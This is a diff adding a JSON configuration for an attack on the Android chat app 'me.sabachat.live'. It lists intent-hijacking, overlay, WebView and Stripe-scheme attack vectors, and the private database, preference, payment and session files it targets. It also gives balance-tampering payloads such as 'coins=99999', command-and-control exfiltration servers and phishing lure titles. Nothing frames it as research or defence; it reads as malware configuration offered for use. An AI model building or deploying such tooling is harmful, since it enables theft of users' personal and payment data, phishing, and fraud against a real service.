@@ -1,0 +1,82 @@
+{
+  "primary_target": {
+    "app_id": "me.sabachat.live",
+    "package_name": "me.sabachat.live",
+    "version": "1.2.5",
+    "version_code": 33,
+    "min_sdk": 21,
+    "target_sdk": 36,
+    "compile_sdk": 36
+  },
+  "attack_vectors": {
+    "intent_scheme": "saba://voice",
+    "stripe_scheme": "stripe-auth://link-accounts/me.sabachat.live",
+    "link_popup_scheme": "link-popup://complete/me.sabachat.live",
+    "stripe_sdk_scheme": "stripesdk://payment_return_url/me.sabachat.live",
+    "webview_exploit": true,
+    "overlay_attack": true,
+    "stripe_exploit": true,
+    "foreground_service_exploit": true,
+    "intent_hijacking": true
+  },
+  "data_targets": {
+    "shared_prefs": [
+      "/data/data/me.sabachat.live/shared_prefs/me.sabachat.live_preferences.xml",
+      "/data/data/me.sabachat.live/shared_prefs/user_data.xml",
+      "/data/data/me.sabachat.live/shared_prefs/payment_info.xml"
+    ],
+    "databases": [
+      "/data/data/me.sabachat.live/databases/saba_database.db",
+      "/data/data/me.sabachat.live/databases/coins.db",
+      "/data/data/me.sabachat.live/databases/user_info.db"
+    ],
+    "files": [
+      "/data/data/me.sabachat.live/files/config.json",
+      "/data/data/me.sabachat.live/files/user_settings.json",
+      "/data/data/me.sabachat.live/files/payment_history.json"
+    ],
+    "cache": [
+      "/data/data/me.sabachat.live/cache/temp_data.cache",
+      "/data/data/me.sabachat.live/cache/user_session.cache"
+    ]
+  },
+  "exploit_payloads": {
+    "coin_injection": "coins=99999",
+    "premium_unlock": "is_premium=true",
+    "vip_access": "vip_level=10",
+    "diamond_injection": "diamonds=50000",
+    "gold_injection": "gold=100000"
+  },
+  "permissions_to_exploit": [
+    "android.permission.SYSTEM_ALERT_WINDOW",
+    "android.permission.SYSTEM_OVERLAY_WINDOW",
+    "android.permission.FOREGROUND_SERVICE_MICROPHONE",
+    "android.permission.FOREGROUND_SERVICE",
+    "android.permission.READ_EXTERNAL_STORAGE",
+    "android.permission.WRITE_EXTERNAL_STORAGE"
+  ],
+  "target_activities": {
+    "main": "me.sabachat.live.live.SabaMainActivity",
+    "login": "me.sabachat.live.live.signin.SabaIdPasswordLoginActivity",
+    "payment": "me.sabachat.live.live.me.SabaMyPayActivity",
+    "webview": "me.sabachat.live.live.SabaWebPageActivity",
+    "recharge": "me.sabachat.live.live.me.SabaRechargeRecordActivity",
+    "withdraw": "me.sabachat.live.live.me.SabaWithdrawActivity",
+    "gift": "me.sabachat.live.live.me.SabaMyGiftWallActivity"
+  },
+  "c2_config": {
+    "primary_server": "https://c2.saba-null.xyz/saba_collect",
+    "backup_servers": [
+      "https://backup1.sabanull.xyz/data",
+      "https://backup2.tor2web.io/log"
+    ],
+    "encryption_method": "AES-256-GCM",
+    "key_rotation_interval": 3600
+  },
+  "phishing_templates": {
+    "update_alert": "Saba Live Security Update",
+    "free_coins": "Get 50,000 Free Coins",
+    "payment_issue": "Payment Verification Required",
+    "account_suspension": "Account Suspension Alert"
+  }
+}
